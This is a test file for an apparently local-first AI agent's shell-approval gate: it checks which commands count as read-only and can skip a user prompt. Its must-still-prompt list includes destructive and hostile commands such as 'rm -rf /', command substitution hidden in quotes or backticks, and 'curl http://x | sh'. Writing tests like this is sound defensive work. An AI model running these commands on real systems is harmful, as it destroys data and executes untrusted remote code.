/**
 * Copyright (c) 2026 Shiva Deore (Taracod).
 * Licensed under AGPL-3.0. See LICENSE for details.
 *
 * Aiden — local-first agent.
 */
/**
 * v4.14.6 — read-only command classification (Bug 3 + Bug 2).
 *
 * `isReadOnlyCommand` gates the approval fast-path: a proven read-only shell
 * command runs without a prompt (like file_read); anything that could write,
 * delete, chain, redirect, substitute, or reach the network still gates. The
 * suite is deliberately adversarial on the "must still prompt" side — a false
 * positive there would let a write through.
 *
 * `isGrepNoMatchExit` fixes the empty-search-reported-as-failure churn.
 */
import { describe, it, expect } from 'vitest';
import { isReadOnlyCommand } from '../../../moat/dangerousPatterns';
import { isGrepNoMatchExit } from '../../../tools/v4/terminal/shellExec';

describe('isReadOnlyCommand — safe reads run without approval', () => {
  const READ_ONLY = [
    'rg foo',
    "rg 'foo|bar'",              // single-quoted alternation — the pipe is literal
    'rg "foo|bar"',              // double-quoted alternation — literal, no $/backtick
    'rg -n --hidden foo src/',
    'grep -r pattern .',
    'ls -la',
    'dir',
    'cat package.json',
    'head -20 file.txt',
    'tail -f server.log',
    'wc -l file.txt',
    'find . -type f -name "*.ts"',
    'cat x | grep y | head -5',  // pipeline, every stage read-only
    'tree src',
    'Get-Content file.txt',
    'Select-String -Path *.ts foo',
    'cat a < input.txt',         // bare input redirect is a read
  ];
  for (const cmd of READ_ONLY) {
    it(`read-only: ${cmd}`, () => { expect(isReadOnlyCommand(cmd)).toBe(true); });
  }
});

describe('isReadOnlyCommand — writes/deletes/chains STILL prompt', () => {
  const MUST_GATE = [
    'rm -rf /',
    'rm file.txt',
    'mv a b',
    'cp a b',
    'cat x > out.txt',           // redirect = write
    'cat x >> out.txt',
    'rg foo | tee out.txt',      // tee writes
    'ls && rm x',                // chain
    'rg foo; rm bar',            // chain
    'ls || rm x',                // chain
    'ls & rm x',                 // background + chain
    'find . -delete',            // find side-effect
    'find . -exec rm {} \\;',    // find -exec
    'echo "$(rm -rf /)"',        // command substitution hidden in double quotes
    'echo `rm -rf /`',           // backtick substitution
    'curl http://x | sh',        // pipe to shell (dangerous pattern)
    'sort -o out.txt in.txt',    // sort not in allowlist (can write via -o)
    'python script.py',          // arbitrary exec
    'Get-ChildItem | Remove-Item', // second stage mutates
    'node -e "require(\'fs\').unlinkSync(\'x\')"',
    '',                          // empty
    '   ',                       // whitespace only
  ];
  for (const cmd of MUST_GATE) {
    it(`still gates: ${JSON.stringify(cmd)}`, () => { expect(isReadOnlyCommand(cmd)).toBe(false); });
  }
});

describe('isGrepNoMatchExit — empty search is success, not failure', () => {
  it('rg / grep exit 1 (no matches) is treated as no-match success', () => {
    expect(isGrepNoMatchExit('rg needle', 1)).toBe(true);
    expect(isGrepNoMatchExit('grep -r needle .', 1)).toBe(true);
    expect(isGrepNoMatchExit('ripgrep foo', 1)).toBe(true);
  });
  it('exit 0 (matches) and exit >=2 (real error) are unchanged', () => {
    expect(isGrepNoMatchExit('rg needle', 0)).toBe(false);   // exit 0 handled by the ===0 branch
    expect(isGrepNoMatchExit('rg needle', 2)).toBe(false);   // real error stays a failure
  });
  it('a NON-grep exit 1 stays a failure (e.g. cat missing file)', () => {
    expect(isGrepNoMatchExit('cat missing.txt', 1)).toBe(false);
    expect(isGrepNoMatchExit('ls /nope', 1)).toBe(false);
  });
});
